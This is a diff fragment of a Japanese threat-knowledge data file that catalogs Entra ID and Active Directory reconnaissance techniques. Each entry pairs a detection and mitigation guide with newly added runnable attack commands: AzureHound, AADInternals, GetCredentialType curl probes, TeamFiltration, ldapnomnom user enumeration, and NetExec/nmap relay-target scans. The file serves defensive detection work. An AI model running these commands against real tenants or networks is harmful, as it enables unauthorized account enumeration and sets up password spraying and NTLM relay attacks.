     "mitigate": "(1) Microsoft のサーバ側修正により対象ファーストpar티 SP への資格情報認証はブロック済み（Device Registration Service 等は 2024年、Exchange Online は 2025年8月）。過去に付与された残存資格情報を Get-MgServicePrincipal で監査し除去する（AppId 01cb2876-7ebd-4aa4-9cc9-d28bd4d359a9 の keyCredentials/passwordCredentials 件数を確認）。(2) App instance property lock（アプリ インスタンス プロパティ ロック）を有効化し、SP への資格情報追加を防止。(3) Application Administrator / Cloud Application Administrator の付与を最小化し PIM で JIT 化。(4) 特権ロール（Global Administrator）はクラウド専用アカウントに限定し、federated ドメイン悪用と組み合わせた偽造を抑止。(5) Conditional Access でワークロード ID / SP サインインを場所・リスクで制限。(6) Purple Knight / DSP の「Suspicious credentials on Microsoft service principal」指標で継続監視。",
@@ -9902,6 +16142,33 @@ AD.I18N.ja.attacks = [
     "summary": "AzureHoundはBloodHound系のGo製列挙ツールで、Microsoft Graph APIとAzure Resource Manager(ARM) REST APIを正規に呼び出してEntra ID/Azureのユーザー・グループ・アプリ・サービスプリンシパル・ロール割り当て・サブスクリプション等を収集し、クラウド攻撃経路(特権昇格)を可視化する。CVEではなく正規API悪用のため、Void Blizzard(2025年5月)・Storm-0501(2025年8月)・Curious Serpens(Peach Sandstorm)等の実攻撃でも偵察段階に使われており、検知は「利用パターンの異常」に依存する。MITRE的にはT1087.004(クラウドアカウント列挙)とT1069.003(クラウドグループ列挙)。",
     "how": "前提: 攻撃者は既に何らかのEntra IDプリンシパルの認証手段(ユーザー名/パスワード、リフレッシュトークン、JWT、サービスプリンシパルのシークレット/証明書のいずれか)を保有していればよく、被害者環境内でのコード実行は不要(攻撃者ホストからリモート実行可能)。標準の読み取り(Directory Readers相当)権限で大半を列挙できる。手順: (1)攻撃者ホストで`azurehound -u user -p pass -t <tenant> list --output out.json`等を実行。既定でMicrosoft Azure PowerShellのクライアントID `1950a258-227b-4e31-a9cf-717495945fc2` を使ってlogin.microsoftonline.comからトークンを取得。(2)`graph.microsoft.com/v1.0`へ大量のGET(/organization, /users, /groups, /servicePrincipals, /applications, /devices, /roleManagement/directory/roleAssignments 等)。(3)`management.azure.com`(ARM)へGETしサブスクリプション/リソースグループ/VM/Key Vault/RBAC割り当てを収集。中核プリミティブは「正規Graph/ARMの読み取りAPIを網羅的に列挙し、BloodHound(cloud)でAzureRM/AZ系エッジとして攻撃経路をグラフ化」する点(=T1087.004/T1069.003)。既定UAは `azurehound/<version>` だが変更可。ARMのGET読み取りは監査ログに残りにくく死角となる。CVE/パッチは存在せず、対象はテナント設定・権限モデルそのもの。",
     "tools": "AzureHound (azurehound.exe / azurehound バイナリ), BloodHound Community/Enterprise (cloud), ROADtools/roadrecon, Microsoft Graph PowerShell, Az CLI/Az PowerShell (トークン取得の踏み台)",
+    "cmd": [
+      {
+        "tool": "AzureHound",
+        "t": "既定のAzure PowerShellクライアントIDでGraph/ARM双方を認証しBloodHound用に網羅列挙する",
+        "q": "azurehound.exe -u user@corp.onmicrosoft.com -p 'Passw0rd!' list --tenant corp.onmicrosoft.com -o output.json"
+      },
+      {
+        "tool": "AzureHound",
+        "t": "リフレッシュトークンのみで実行可能。パスワード認証を経ないためEntraサインインログの一部に痕跡が残らない",
+        "q": "azurehound -r <refresh_token> list --tenant corp.onmicrosoft.com -o output.json"
+      },
+      {
+        "tool": "Graph API",
+        "t": "azurehoundが内部で叩くAPIを直接呼ぶ形。短時間に多数のGraphエンドポイントへ列挙系GETが連続するのが痕跡",
+        "q": "Invoke-RestMethod -Uri \"https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments\" -Headers @{Authorization=\"Bearer <token>\"}"
+      },
+      {
+        "tool": "Az CLI",
+        "t": "azurehound実行前のトークン取得踏み台。az loginでの認証がEntraサインインログに対話型として記録される",
+        "q": "az login -u user@corp.onmicrosoft.com -p 'Passw0rd!' ; az account get-access-token --resource https://graph.microsoft.com"
+      },
+      {
+        "tool": "Graph PowerShell",
+        "t": "正規署名モジュールでの列挙のため実行ファイル検知は効かない。Graph監査ログ上はazurehoundと同一APIパターンになる",
+        "q": "Connect-MgGraph -Scopes \"Directory.Read.All\"; Get-MgUser -All"
+      }
+    ],
     "detect": "主なテレメトリはクラウド側: (1)Microsoft Graph Activity Logs(Log Analytics/Sentinelでは MicrosoftGraphActivityLogs テーブル、要有効化)— 単一プリンシパルからGraphへの短時間・大量GET(/users,/groups,/servicePrincipals,/roleManagement 等の複数リソース種別)。既定UAは `azurehound/<version>` だが攻撃者が改変可。(2)Entra サインインログ(SigninLogs/EntraIdSignInEvents)— App=「Microsoft Azure PowerShell」(AppId 1950a258…)でResource=「Microsoft Graph」への非対話/普段と異なるIP・国からのサインイン。(3)Entra 監査ログ(AuditLogs)は列挙自体は残さないが、後続のロール/資格情報追加を捕捉。(4)CloudAppEvents でGraph/Office活動を相関(Defender XDRでのGraphアクティビティ近似にも使える)。エンドポイントでは攻撃者ホストで azurehound プロセス実行と graph.microsoft.com/management.azure.com への発信を捕捉(MDE/CrowdStrike)。検知の勘所は「量(1時間で1000+ユニークGET)×多様性(4+リソース種別)×新規IP/UA」の相関。",
     "events": "MicrosoftGraphActivityLogs (single principal GET burst across /users,/groups,/servicePrincipals,/applications,/roleManagement = exhaustive enumeration; default UA azurehound/<version>), Entra SignIn (App=Microsoft Azure PowerShell AppId 1950a258-227b-4e31-a9cf-717495945fc2, Resource=Microsoft Graph, non-interactive), Entra Audit (follow-on Add role assignment / Add app credential), Security 4688 (azurehound.exe on attacker host)",
     "mitigate": "CVE/パッチは無いため設定と権限で緩和する: (1)最小権限 — 既定の全ユーザーによるテナント列挙を制限(Entra「External collaboration/ユーザー設定」で他ユーザー/アプリ/デバイス読み取りを制限、Guest権限を最小化)。(2)条件付きアクセス(CA) — 「Microsoft Azure Management」やGraphを狙う不明デバイス/国/リスクサインインをブロック、レガシー認証停止、管理系にフィッシング耐性MFA+準拠デバイス必須。(3)Identity Protection のリスクベースCAで異常サインインをブロック。(4)Microsoft Graph Activity Logs を有効化しLog Analytics/Sentinelへ長期保管(サインインログは既定30日)。(5)特権の棚卸し・PIM(Just-in-Time)で常設ロールを削減、サービスプリンシパルの長寿命シークレット/証明書を排除しトークン窃取の価値を下げる。(6)トークン保護(token binding)・リフレッシュトークン失効の運用。",
@@ -9947,6 +16214,38 @@ AD.I18N.ja.attacks = [
     "summary": "認証情報ゼロの攻撃者が、Microsoftの公開エンドポイント(getuserrealm.srf、common/GetCredentialType、/common/userrealm、autodiscover、OpenID構成)へ問い合わせるだけで、標的テナントのテナントID、Managed/Federatedドメイン、Seamless SSO(Desktop SSO)、証明書ベース認証(CBA)、Entra Connect(DirSync)構成、そして実在ユーザー名を列挙する外部偵察。すべてMicrosoftの共有インフラ宛のクエリで完結し、被害テナントへのサインイン(ログオン)は一切発生しない。とりわけGetCredentialTypeの通常(Normal)フローはサインインログを増やさないため、偵察自体は被害者側テレメトリにほぼ痕跡を残さず不可視で、現実的な検知は後続段階から始まる。ここで得たフェデレーション状態と検証済みユーザー一覧が、パスワードスプレー/AiTM/デバイスコードフィッシングの選択と成否を決める。MITRE的にはT1590.001(ドメインプロパティ=フェデレーション/ドメイン指紋)、T1589.002(メールアドレス収集=GetCredentialTypeによるユーザー名一括検証)、T1087.004(クラウドアカウント列挙)、T1526(クラウドサービス探索)。",
     "how": "前提: 攻撃者は資格情報を一切持たず、自前ホストからの外向き通信のみでよい。被害環境でのコード実行・アカウント・トークンは不要で、標的テナントには一切ログオンしない。(1)テナント指紋: GET https://login.microsoftonline.com/<domain>/.well-known/openid-configuration がissuerにテナントGUIDとリージョンを返す。GET https://login.microsoftonline.com/getuserrealm.srf?login=user@domain&xml=1 のNameSpaceTypeでManaged/Federated/Unknownを判別し、Federatedなら返却されるAuthURLで連携先IdP(ADFS等)のホスト名=オンプレ連携サーバが露見する(T1590.001)。(2)ドメイン列挙: AADInternalsのInvoke-AADIntReconAsOutsiderが、テナントに登録された全ドメインと各々の認証種別(Managed/Federated)、DNS(MX=Exchange Online、MTA-STS、DKIM、DMARC)、検証済みか否かを一括収集する。(3)機能指紋: GetCredentialTypeの応答EstsProperties.DesktopSsoEnabled=trueでSeamless SSO(Desktop SSO)の有無を、autologon.microsoftazuread-sso.comの存在で同機能を確認し、CBAやEntra Connect、MDI(Defender for Identity)存在のヒント、ブランド名も拾う(T1526)。(4)ユーザー名検証(T1589.002): POST https://login.microsoftonline.com/common/GetCredentialType に {\"Username\":\"user@domain\",\"isOtherIdpSupported\":true} を送ると、IfExistsResultが 0=実在 / 1=不在 / 4=エラー / 5=別のMicrosoft IdP(別テナントやコンシューマMSA)に実在(ExistsInOtherMicrosoftIDP) / 6=両IdPに実在(ExistsBothIDPs) を返す(実在判定は0または6)。スロットリングはIfExistsResultではなく別フィールドのThrottleStatus(0=なし/1=AAD/2=MSA)で示され、これが1/2のときは応答が信頼できず、不在ユーザが実在に見える誤検知が生じる。これでユーザー一覧を「サインインせずに」一括検証できる点が核心で、Normal(通常)フローは被害テナントのサインインログを増やさないため静かである。o365creeperはリストを、TeamFiltrationは--enumでこれを自動化する。Federatedドメインではこの検証が連携IdPへ委譲され信頼性が落ちるため、その場合はgetuserrealmのAuthURL指紋が主軸になる。なおMailSniperのInvoke-UsernameHarvestOWA/Invoke-DomainHarvestOWAはOWA/Autodiscoverの応答タイミング差で実在ユーザを推定する別系統の外部列挙で、こちらは(オンプレExchange時)被害者側のExchange/OWAに到達しうる。GetCredentialType/getuserrealm系はすべてlogin.microsoftonline.com等のMicrosoft共有エンドポイント宛で被害テナントに認証イベントを生まないため、偵察は実質的に防御側から不可視で、検知は検証済みリストが使われる後続(スプレー/AiTM/デバイスコード)から現実的に始まる。得た結果は判断に直結する: Managedならスプレー/AiTM、FederatedならADFS/PTA/PHS攻撃やGolden SAML準備、Seamless SSO有効ならKerberos/サイレントトークン悪用の経路が選ばれる。",
     "tools": "AADInternals (Invoke-AADIntReconAsOutsider, Invoke-AADIntUserEnumerationAsOutsider, Get-AADIntLoginInformation, Get-AADIntOpenIDConfiguration), AADOutsider-py, o365creeper, TeamFiltration (--enum), MailSniper (Invoke-UsernameHarvestOWA, Invoke-DomainHarvestOWA — OWA/Autodiscoverタイミング列挙; Invoke-UsernameHarvestMicrosoftLive), OneDrive/Autodiscover 列挙スクリプト, getuserrealm.srf / GetCredentialType の直叩き(curl/Invoke-WebRequest)",
+    "cmd": [
+      {
+        "tool": "AADInternals",
+        "t": "テナントの検証済みドメインとManaged/Federated種別を取得。Microsoft共有エンドポイント宛のみで被害側に認証イベントが残らない",
+        "q": "Invoke-AADIntReconAsOutsider -DomainName corp.com | Format-Table"
+      },
+      {
+        "tool": "AADInternals",
+        "t": "GetCredentialTypeを内部で叩きユーザー実在を検証。サインインを伴わないためNormalフローは実質不可視",
+        "q": "Invoke-AADIntUserEnumerationAsOutsider -UserName user@corp.com"
+      },
+      {
+        "tool": "curl",
+        "t": "NameSpaceTypeでManaged/Federatedを判別。Federatedの場合AuthURLに連携先ADFSホスト名が露見する",
+        "q": "curl \"https://login.microsoftonline.com/getuserrealm.srf?login=user@corp.com&xml=1\""
+      },
+      {
+        "tool": "curl",
+        "t": "IfExistsResult 0/6で実在ユーザーを判定。ThrottleStatusが立つと誤検知するが応答自体は被害テナントに残らない",
+        "q": "curl -s -X POST \"https://login.microsoftonline.com/common/GetCredentialType\" -H \"Content-Type: application/json\" -d '{\"Username\":\"user@corp.com\",\"isOtherIdpSupported\":true}'"
+      },
+      {
+        "tool": "TeamFiltration",
+        "t": "GetCredentialType(`--validate-msol`)でユーザー名一括検証を自動化。約20req/秒とスロットル耐性重視の低速設定",
+        "q": "TeamFiltration --enum --validate-msol --domain corp.com --outpath C:\\TFOutput"
+      },
+      {
+        "tool": "MailSniper",
+        "t": "OWA/Autodiscoverの応答タイミング差で実在ユーザーを推定する別系統。オンプレExchange到達時はOWA側に接続ログが残る",
+        "q": "Invoke-UsernameHarvestOWA -ExchHostname mail.corp.com -UserList .\\userlist.txt -OutFile owa-valid-users.txt"
+      }
+    ],
     "detect": "偵察フェーズの被害者側テレメトリは原則として存在しない: getuserrealm.srf・GetCredentialType(Normal)・OpenID構成・autodiscoverはいずれもMicrosoftの共有インフラ宛で、かつGetCredentialTypeのNormalフローはサインインログを増やさないため、列挙そのものはSigninLogs/AuditLogsに現れず不可視である(ここを正直に前提化する)。現実的な検知は後続で始まる: SigninLogs/EntraIdSignInEvents(旧EntraIdSignInEvents)に、検証済みリストを使ったスプレー/AiTM/デバイスコードが観測される。決め手は「事前検証済み」の痕跡で、ユーザー不在(50034)率がほぼ0に潰れ、実在ユーザのPW不一致(50126)が支配し、多数の異なるUPNが少数のクラウドIP(VPS/Tor)から、レガシークライアント(Other clients/IMAP/POP)や見慣れない国で試行される。Federatedテナントでは一部の検証(WS-Trust等)がオンプレのADFS/WAP(Web Application Proxy)に到達し、ADFSのSecurity(監査)ログの1203(資格情報検証失敗)やproxyの4625として被害者側に見えることがある。エンドポイントは、監視対象(内部/侵害)ホストで偵察ツールが動いた場合のみ有効で、AADInternals/o365creeper/TeamFiltrationのプロセスと、login.microsoftonline.com・getuserrealm.srf・autologon.microsoftazuread-sso.com・autodiscoverへの発信を捕捉する。相関の勘所は、偵察は見えないという前提の下で「不在率の異常な低さ×多数UPN×新規IP×レガシークライアント」を後続の最速シグナルとして扱うこと。",
     "events": "[偵察フェーズ] 被害者側イベントは基本的に無し — getuserrealm.srf / GetCredentialType(Normal) / OpenID構成 / autodiscover は Microsoft 共有インフラ宛でSigninLogsを増やさず不可視。 [後続で観測] SigninLogs / EntraIdSignInEvents(旧EntraIdSignInEvents) ResultType/ErrorCode 50126(ユーザー実在・PW不一致), 50034(ユーザー不在), 50053(スマートロックアウト), 50055(PW期限切れ), 50076/50079(MFA要求=有効UPNの証跡); フェデレーション時は連携サーバの ADFS Security(監査)ログ 1203(資格情報検証失敗: WS-Trust/WS-Fed/SAML-P/OAuth)・WAP/ADFS proxyの Security 4625。 [操作/内部ホスト] Sysmon 1 / Security 4688(AADInternals/o365creeper/TeamFiltration), Sysmon 3(ネットワーク接続)/Sysmon 22(DNSクエリ)(login.microsoftonline.com, getuserrealm.srf, autologon.microsoftazuread-sso.com, autodiscover.<domain>)",
     "mitigate": "公開APIへの問い合わせ自体は遮断できないため、緩和は「偵察は不可避」と割り切り後続の資格情報攻撃耐性に寄せる: (1)フィッシング耐性MFA(FIDO2/証明書)＋条件付きアクセス(CA)を全面適用し、レガシー認証(Other clients/IMAP/POP/SMTP AUTH)を停止、名前付き場所/リスクベースでスプレー元をブロック、デバイスコードフローを未使用テナントで制限。(2)Entra スマートロックアウト＋Entra パスワード保護で後続スプレーを鈍化。(3)不要ならSeamless SSO(Desktop SSO)を無効化(指紋可能な機能でありサイレントKerberos悪用の足場にもなる)。(4)フェデレーション運用ならPHS(パスワードハッシュ同期)＋クラウド認証へ寄せてADFS攻撃面を縮小し、ADFSはextranetスマートロックアウトを強制。(5)Microsoft Graph Activity Logs/サインインログをLog Analytics/Sentinelへ長期保管し、検証済みリスト由来の後続スプレー(不在率が異常に低い失敗の束)を検知ルール化。(6)Identity Protection のリスクベースCAで異常サインインをブロック、ゲスト/外部共同作業設定の列挙可能範囲を最小化。注意: getuserrealm/GetCredentialType(Normal)は止められないので、防御は必ず下流(MFA・CA・スマートロックアウト・ADFS強化)に置く。",
@@ -9992,6 +16291,23 @@ AD.I18N.ja.attacks = [
     "summary": "DC位置特定用の正規機能「LDAP Ping」(rootDSEへのCLDAP/LDAP検索に NtVer/AAC/User= を載せる)を悪用し、DCがNetlogon(MS-NRPC SamLogon)へ回送して返す応答の Operationコードから認証なしで有効なsAMAccountNameを高速検証する。DCは有効・無効いずれの候補にも NETLOGON_SAM_LOGON_RESPONSE_EX を必ず返す点が肝で、実在かつ有効化済みなら opcode 0x17(LOGON_SAM_LOGON_RESPONSE_EX=23)、非存在または無効化なら opcode 0x19(LOGON_SAM_USER_UNKNOWN_EX=25)となり、この差でヒットを判定する(=有効化済みユーザーだけを選別できスプレーの弾に最適/無効化アカウントは非存在と区別不能)。処理がLDAP検索エンジンを経由しないため、青チームがAD偵察検知の要とするLDAP検索監査(Event 1644 / 4662)には一切残らないのが本質的な脅威。ただしDCにMicrosoft Defender for Identityセンサーがあれば、監査設定に依存せずNIC上のLDAP Ping応答を解析してUSER_UNKNOWNの多発を検知するため「完全な死角」ではない。",
     "how": "「LDAP Ping」はDCロケータ(DC位置特定)用の正規プロトコル機能(MS-ADTS 6.3.3)で、クライアントは匿名でCLDAP(UDP 389)またはTCP LDAPのrootDSEに対しsearchRequestを送り、`netlogon`属性を要求するフィルタに特殊要素 NtVer(NETLOGON_NT_VERSION)・AAC(MS-ADTSが『Represents the userAccountControl attribute』と定義するuserAccountControlのビットマスク)と候補の User=<sAMAccountName> を載せる。DCのLDAPフロントエンド(ntdsa.dll)はこれらNetlogon要素を認識するとクエリをLDAP検索エンジンではなくNetlogonサービス(netlogon.dll / MS-NRPC)へ回送し、SamLogon要求として処理させる。重要なのは、DCは有効・無効いずれの候補にも応答属性「Netlogon」に NETLOGON_SAM_LOGON_RESPONSE_EX を詰めて必ず返すこと。差は構造体の Operationコードで、対象が実在かつ有効化済み(AACビット条件に適合)なら 0x17(LOGON_SAM_LOGON_RESPONSE_EX=23)、非存在または無効化なら 0x19(LOGON_SAM_USER_UNKNOWN_EX=25)を返す。ldapnomnomは応答の 0x17 を『有効』と判定するため、実質的に有効化済みの実在アカウントだけを選別する(無効化アカウントは非存在と区別できない)。バインドもパスワード試行も伴わないためロックアウトを一切起こさず、匿名・高速(READMEは最大約50K/秒/DCを主張)に完結する。正統ツールは ldapnomnom(補助に cldap_ping.py、NetExecのモジュールは副次的)であり、`ldeep enum_users` は認証済みLDAP検索でCLDAP/Netlogon経路とは別物なので混同しない。なお現行 ldapnomnom は真のUDP CLDAPではなくTCP LDAP(既定389、TLS時636)を用いるため、後述のWFP監査で送信元が露見しうる。処理がLDAP検索エンジン/ディレクトリサービスアクセスを通らないため Event 1644/4662 が原理的に発火せず、得た有効名はスマートロックアウトを避ける低速パスワードスプレーの入力になる。",
     "tools": "ldapnomnom(正統; 現行実装はTCP LDAPで既定389/TLS時636), cldap_ping.py(補助), NetExec(ldap系モジュール; 副次), (別経路の認証済みLDAP列挙である `ldeep enum_users` は本手法=CLDAP/Netlogon経路とは非等価)",
+    "cmd": [
+      {
+        "tool": "ldapnomnom",
+        "t": "単一DC狙いのCLDAP/Netlogon回送でopcode 0x17/0x19を判定。LDAP検索エンジンを通らずEvent 1644/4662が発火しない",
+        "q": "ldapnomnom --input users.txt --output valid_users.txt --server dc01.corp.local --parallel 8"
+      },
+      {
+        "tool": "ldapnomnom",
+        "t": "ドメインサフィックスから全DCを自動検出し並列高速検証。複数DCへの同時大量クエリがネットワーク側の唯一の痕跡",
+        "q": "ldapnomnom --input users.txt --output valid_users.txt --dnsdomain corp.local --maxservers 32 --parallel 16"
+      },
+      {
+        "tool": "ldapnomnom",
+        "t": "`--throttle`で単一接続に絞った低速版。MDIのLDAP Ping解析はUSER_UNKNOWN多発で検知できセンサー有無が分水嶺",
+        "q": "ldapnomnom --input users.txt --output valid_users.txt --server dc01.corp.local --throttle 200 --parallel 1"
+      }
+    ],
     "detect": "本手法の肝は「LDAP検索監査に映らない」点にあり、通常のLDAPテレメトリ(Event 1644 診断ログ / 4662 ディレクトリサービスアクセス)に検知を依存できない(Netlogon経路はこれらを発火させない)。可視化の三本柱は次の通り。(1)最優先はDCにMicrosoft Defender for Identity(2.228/2024-02以降)センサーがある環境。センサーはNIC上でTCP/UDP双方のLDAP Pingを直接パースし NETLOGON_SAM_LOGON_RESPONSE_EX の USER_UNKNOWN 応答量を数え、単一送信元からの多発を偵察系アラートとして上げる——監査ポリシーやデバッグログの有効化に依存しない唯一の常時可視化。(2)DCの netlogon.log(Netlogonデバッグログ; nltest /dbflag 等での有効化が前提・既定無効)。User= を変えた大量クエリが1件につき received/response の2行で残り、有効/無効/非存在の別まで見えるが、送信元IPは (null) で記録されるため単体では帰属できない。(3)WFPの Event 5156。現行 ldapnomnom は真のUDP CLDAPではなくTCP LDAPを使うため、object-accessの『フィルタリング プラットフォームの接続』監査を有効化していれば 389(TLS時は636も)への多数接続が送信元IP付きで 5156 に残る(真のUDP CLDAPなら5156は出ない点に注意)。なお 5156 の SourceAddress/DestAddress/DestPort/Application は SecurityEvent の独立列ではなく EventData 文字列内なので抽出が必要。ネットワーク側ではZeek/NDRで単一ソース→DCの 389(UDP/TCP)バーストと、searchRequestに NtVer/AAC/netlogon 属性を含むCLDAPを監視する。4768(Kerberos)は発火せず、逆に『5156やnetlogon.logのPing洪水があるのに1644/4662が皆無』という非対称そのものが強いシグナルになる。",
     "events": "Defender for Identity 偵察アラート(2.228+/2024-02; センサーがNIC上でNETLOGON_SAM_LOGON_RESPONSE_EXのUSER_UNKNOWN多発を検知; 監査設定非依存の常時可視化), 5156(WFP Filtering Platform Connection — ldapnomnomのTCP実装で送信元IP付きの389/636接続を記録; WFP監査有効化が前提; 値はEventData内), netlogon.log(Netlogonデバッグログ; 既定無効; SamLogon/NetlogonSamLogonResponseの洪水だが送信元IPは(null)), (注)1644/4662/4768は原理的に発火せず=この不在自体がシグナル",
     "mitigate": "DCロケータのプロトコル機能そのもので無効化はできないため、緩和は検知配備・境界制御・下流対策が主体。最も効くのはDCへのMicrosoft Defender for Identity(2.228+)センサー配備で、監査設定に依存せずLDAP Ping列挙をネットワーク層で検知する。ワークステーションVLAN等の非管理セグメントからDCへのCLDAP/LDAP 389(UDP/TCP; TLS時636)をファイアウォールで制限し、DC発見を要する経路のみ許可する。WFP『フィルタリング プラットフォームの接続』監査(5156)とNetlogonデバッグログを有効化して死角を埋める。列挙自体はレート制限・ハニーアカウント・推測されにくい命名で価値を下げ、真の被害である下流のパスワードスプレーには細粒度/スマートロックアウト・フィッシング耐性MFA(FIDO2)を強制する。",
@@ -10037,6 +16353,38 @@ AD.I18N.ja.attacks = [
     "summary": "NTLMリレー/強制認証(Coercion)チェーンの前段として、リレー可能・強制可能な標的をあらかじめ扇状走査で棚卸しする偵察技法。SMB署名が『非必須』のホスト(ntlmrelayxの中継先)、WebClient/WebDAVが稼働するホスト(HTTP強制認証のブースター)、Print Spoolerが動作するホスト(PrinterBugの起点)を一覧化する。破壊的なリレー/Coercion本体が動く前に必ず発火するため、SOCにとって精度の高い早期警戒シグナルとなる。",
     "how": "内部ネットワークを横断スキャンし、3系統の標的を列挙する。SMB署名確認はセッション確立前のSMB2 NEGOTIATE応答を読むだけで完結するため匿名/事前認証で成立するが、WebDAV/Spoolerのパイプ確認は有効な資格情報(多くはAuthenticated Users)を要する。(1)SMB署名: 各ホストのSMB2 NEGOTIATEレスポンスのSecurityMode(SMB2_NEGOTIATE_SIGNING_REQUIREDビット=0x0002)を確認し、署名が『非必須』のホストをntlmrelayxのターゲット一覧に落とす。netexec smb <range> --gen-relay-list relay.txt、RunFinger.py、Nmap --script smb2-security-mode を使用する。(2)WebDAV/WebClient: IPC$へ接続し名前付きパイプ \\\\PIPE\\\\DAV RPC SERVICE の存在有無でWebClientサービス稼働ホストを特定する。webclientservicescanner、GetWebDAVStatus.py、nxc -M webdav を使用。WebClientが動くホストは file:// / search-ms / searchConnector や \\\\\\\\attacker@80\\\\path 形式で誘導するとHTTPでNTLM認証を送出するため、署名が効かないHTTP経路でADCS Web登録(ESC8)やLDAPへリレーできる強力な起点になる。(3)Print Spooler: RPCエンドポイントマッパー(135)やIPC$上の \\\\pipe\\\\spoolss に対しMS-RPRN(spoolss、UUID 12345678-1234-abcd-ef00-0123456789ab v1.0)の稼働を確認する。rpcdump.py | grep MS-RPRN、SpoolerScanner(RpcOpenPrinter/RpcRemoteFindFirstPrinterChangeNotification)、nxc -M spooler を使い、PrinterBug(MS-RPRN)やPetitPotam/DFSCoerce系強制認証の起点候補を洗い出す(新しめのWindows 11ではspoolssがnamed pipeではなくncacn_ip_tcpのみのこともある)。いずれの結果もリレー(ntlmrelayx)や強制認証(NetExec -M coerce_plus / PetitPotam / PrinterBug / DFSCoerce)チェーンへの直接入力となる。列挙自体は資格情報を奪取せず破壊も伴わないため見過ごされやすいが、直後の中継/強制認証と必ず連鎖する点が検知の勘所である。",
     "tools": "NetExec/nxc(smb --gen-relay-list、列挙は -M webdav / -M spooler、後続の強制認証は -M coerce_plus〈PrinterBug/PetitPotam/DFSCoerce/ShadowCoerce/MSEven統合〉; ※-M ms-rprnという列挙モジュールは存在しない), RunFinger.py(Responder付属), webclientservicescanner, GetWebDAVStatus.py, SpoolerScanner, rpcdump.py(impacket), Nmap smb2-security-mode",
+    "cmd": [
+      {
+        "tool": "NetExec",
+        "t": "SMB2 NEGOTIATE応答のSecurityModeのみで署名要否を判定。セッション確立前に完結し匿名探索でも成立してしまう",
+        "q": "nxc smb 10.0.0.0/24 --gen-relay-list relay.txt"
+      },
+      {
+        "tool": "NetExec",
+        "t": "IPC$上の名前付きパイプ`\\PIPE\\DAV RPC SERVICE`の有無でWebClient稼働ホストを特定。HTTP経由リレーの起点選定に直結",
+        "q": "nxc smb 10.0.0.0/24 -u svc_user -p 'Passw0rd!' -M webdav"
+      },
+      {
+        "tool": "NetExec",
+        "t": "MS-RPRN(spoolss)の稼働有無を確認しPrinterBug/Coercion起点を棚卸し。認証済みIPC$接続の急増が痕跡",
+        "q": "nxc smb 10.0.0.0/24 -u svc_user -p 'Passw0rd!' -M spooler"
+      },
+      {
+        "tool": "WebClientScanner",
+        "t": "Linux側からWebClient稼働をIPC$経由で確認。DC以外には端末プロセスログが残らずSMB接続元IPのみが手掛かり",
+        "q": "webclientservicescanner corp.local/svc_user:'Passw0rd!'@10.0.0.0/24"
+      },
+      {
+        "tool": "rpcdump.py",
+        "t": "RPCエンドポイントマッパー(135)を列挙しMS-RPRN登録の有無を確認。135への到達自体が事前偵察の兆候になりうる",
+        "q": "rpcdump.py corp.local/svc_user:'Passw0rd!'@10.0.0.20 | grep MS-RPRN"
+      },
+      {
+        "tool": "nmap",
+        "t": "SMB署名要否をポートスキャンレベルで一括判定。認証不要のため445への大量到達だけがネットワーク側唯一の痕跡",
+        "q": "nmap --script smb2-security-mode -p445 10.0.0.0/24"
+      }
+    ],
     "detect": "標的側の詳細ファイル共有監査(5145)で、ShareName=IPC$かつRelativeTargetNameが『DAV RPC SERVICE』(WebDAV確認)や『spoolss』(Spooler確認)への名前付きパイプアクセスが、単一ソースから多数ホストへ扇状に発生するのが最も高精度なシグナル。SMB署名確認はSMB2 NEGOTIATEのみで完結し4624を伴わないこともあるが、匿名/低権限のType3ログオン(4624 NTLM/ANONYMOUS LOGON)や135(EPMのept_map)への広範な接続と相関して捉える。発信元端末のEDRでnetexec/RunFinger/webclientservicescanner/rpcdump/SpoolerScanner等の実行と、445/135への短時間・多数ホスト接続を捕捉する。破壊的リレー/強制認証の前段であるため、この扇状プローブを検知できれば中継が起きる前に遮断できる。",
     "events": "5145(名前付きパイプ: RelativeTargetName='DAV RPC SERVICE'/'spoolss'/'srvsvc'), 5140(IPC$接続), 4624(Type3/NTLM/ANONYMOUS LOGON), 5156(WFP: 445/135許可接続), Sysmon 3(445/135扇状接続), Sysmon 1(列挙ツール実行)",
     "mitigate": "全ホストでSMB署名を『必須(Always)』に強制するGPO(『Microsoftネットワークサーバー/クライアント: 常に通信にデジタル署名を行う』)を適用し、リレー標的そのものを消す(Windows 11 24H2は受信/送信ともSMB署名必須が既定、Windows Server 2025は送信署名が既定必須)。不要な端末ではWebClientサービスを無効化・起動禁止にし、HTTP強制認証のブースターを排除する。DC/サーバでは不要なPrint Spoolerを停止し(PrintNightmare/PrinterBug対策)、RpcRemoteFindFirstPrinterChangeNotificationの悪用面を削減する。リレー先の無力化としてDCのLDAP署名+チャネルバインディング(EPA)強制、ADCS Web登録のEPA/HTTPS化(ESC8対策)を併用する。詳細ファイル共有監査(5145)を有効化して『DAV RPC SERVICE』/『spoolss』パイプ探索を可視化する。",
@@ -10082,6 +16430,33 @@ AD.I18N.ja.attacks = [
     "summary": "有効なトークンを1つ握った攻撃者がGraphRunner・ROADrecon・GraphSpyでテナントの『ポリシー姿勢』を列挙する偵察。狙うのはアイデンティティ・グラフ(=AzureHound)ではなく、条件付きアクセス(CA)ポリシーのMFA/場所/アプリ除外、動的グループのmembershipRule、アプリ登録・委任/アプリケーション権限、ゲスト招待設定・名前付き場所といった構成そのもので、次に通り抜けるConditional Accessの穴と自己参加できる動的グループを事前に見つける。CVEではなく正規Graph読み取りAPIの悪用で、Conditional-Accessバイパスの直前兆候。マップ既存のAzureHound(T1087.004/T1069.003, 列挙ツール/手法)とは読み取り対象が異なり、本エントリはマップに欠落していたT1526(クラウドサービスディスカバリ=Entra等のクラウドサービス構成・セキュリティサービスの列挙。管理コンソール『閲覧』のT1538とは別技法)の新規カバレッジを追加する。",
